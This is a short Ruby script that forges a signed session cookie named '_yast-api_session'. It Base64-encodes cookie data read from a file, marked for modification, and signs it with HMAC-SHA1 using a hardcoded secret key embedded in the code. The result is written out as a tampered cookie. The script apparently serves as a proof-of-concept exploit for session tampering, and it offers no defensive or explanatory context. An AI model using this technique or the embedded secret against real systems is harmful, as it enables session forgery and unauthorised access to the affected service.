require 'cgi'
require 'cgi/session'
require 'openssl'			 # to generate the HMAC message digest
require 'base64'

cookie_name = "_yast-api_session="
secret = "9d11bfc98abcf9799082d9c34ec94dc1cc926f0f1bf4bea8c440b497d96b14c1f712c8784d0303ee7dd69e382c3e5e4d38d4c56d1b619eae7acaa6516cd733b1"
data_plain = File.read("cookie_data_plain.bin").strip

data_enc = Base64.encode64(data_plain)
data_enc = data_enc.strip
data_esc = CGI.escape(data_enc)
printf("data encoded:\n'%s'\n\n", data_enc)
printf("data escaped:\n'%s'\n\n", data_esc)

# modify the cookie data here


digest_sec = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::Digest.new("SHA1"), secret, data_enc)

printf("digest: %s\n\n", digest_sec)

fname = "cookie_modified.txt"
f = File.new(fname, "w+")
f.write(cookie_name + data_esc + "--" + digest_sec + "\n")
f.close
printf "wrote cookie data to '%s'\n\n", fname

